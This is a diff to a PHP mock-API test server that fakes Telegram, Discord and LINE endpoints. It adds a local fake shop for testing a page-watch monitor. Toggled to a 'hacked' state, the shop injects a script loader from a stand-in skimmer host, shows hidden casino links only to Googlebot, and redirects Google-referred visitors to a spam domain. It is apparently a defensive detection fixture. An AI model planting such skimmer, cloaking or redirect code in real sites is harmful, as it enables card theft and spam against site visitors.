@@ -28,6 +28,17 @@
  *   slow            answers after 12 seconds (longer than the module waits)
  *   gone            Telegram: chat not found (400); Discord: unknown webhook (404)
  * Like the real ones it refuses a message longer than 4096 (Telegram) or 2000 (Discord) characters.
+ *
+ * LINE's "how many friends" question (GET /v2/bot/insight/followers?date=yyyyMMdd) answers 3 friends;
+ * FAKE_LINE_FRIENDS=500 php -S ... to play the account your customers follow.
+ *
+ * And a small shop for trying `page_watch`:
+ *   'page_watch' => array('http://127.0.0.1:8765/shop/')
+ *   http://127.0.0.1:8765/shop/hack   from now on the shop is "hacked": a card-skimming script for everybody,
+ *                                     spam links only for Google's crawler, and visitors coming from Google
+ *                                     are redirected to a spam site
+ *   http://127.0.0.1:8765/shop/clean  back to normal
+ *   /shop/moved redirects to /shop/ (same site), /shop/away to another site.
  */
 
 $inbox = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-line-inbox.ndjson';
@@ -69,6 +80,63 @@ if (strpos((string) $path, '/hook/') === 0 && $_SERVER['REQUEST_METHOD'] === 'PO
     file_put_contents($inbox, json_encode(array('t' => time(), 'hook' => $shown), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
     file_put_contents('php://stderr', "\n----- webhook received -----\n" . $shown . "\n");
     return reply(200, array('ok' => true));
+}
+if (strpos((string) $path, '/shop/') === 0)
+{
+    $flag = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-shop-hacked.flag';
+    if ($path === '/shop/hack' || $path === '/shop/clean')
+    {
+        $path === '/shop/hack' ? touch($flag) : @unlink($flag);
+        header('Content-Type: text/plain');
+        echo $path === '/shop/hack' ? "The shop is now hacked.\n" : "The shop is clean again.\n";
+        return true;
+    }
+    if ($path === '/shop/moved')
+    {
+        header('Location: /shop/', true, 301);
+        return true;
+    }
+    if ($path === '/shop/away')
+    {
+        header('Location: https://elsewhere.example/landing', true, 302);
+        return true;
+    }
+    if ($path !== '/shop/')
+    {
+        return reply(404, array('message' => 'Not found'));
+    }
+    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    $ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $hacked = is_file($flag);
+    if ($hacked && strpos($ref, 'google.') !== false && stripos($ua, 'Googlebot') === false)
+    {
+        header('Location: https://spam-landing.example/?from=shop', true, 302);   // visitors from Google are sent away
+        return true;
+    }
+    $html = '<!doctype html><html><head><meta charset="utf-8"><title>Fake shop</title>'
+        . '<script src="/js/app.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-TEST"></script>'
+        . ($hacked ? '<script>var s=document.createElement("script");s.src="https:\/\/cdn-skimmer.example\/s.js";document.head.appendChild(s);</script>' : '')
+        . '</head><body><h1>Fake shop</h1><a href="/cart">Cart</a> <a href="https://www.facebook.com/fakeshop">Facebook</a>'
+        . '<form action="/search"><input name="q"></form>'
+        . ($hacked && stripos($ua, 'Googlebot') !== false ? '<div style="display:none"><a href="https://casino-spam.example/">casino</a></div>' : '')
+        . '</body></html>';
+    $enc = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';
+    header('Content-Type: text/html; charset=UTF-8');
+    if (strpos($enc, 'gzip') !== false && function_exists('gzencode'))
+    {
+        header('Content-Encoding: gzip');   // curl asks for it and unpacks it; plain streams do not ask
+        $html = gzencode($html);
+    }
+    echo $html;
+    return true;
+}
+if ($path === '/v2/bot/insight/followers' && $_SERVER['REQUEST_METHOD'] === 'GET')
+{
+    if (!isset($_GET['date']) || !preg_match('/^\d{8}$/', (string) $_GET['date']))
+    {
+        return reply(400, array('message' => 'date is required'));
+    }
+    return reply(200, array('status' => 'ready', 'followers' => (int) (getenv('FAKE_LINE_FRIENDS') ?: 3), 'targetedReaches' => 0, 'blocks' => 0));
 }
 /** Telegram and Discord count in UTF-16 code units: an emoji is two. */
 function units16($s)
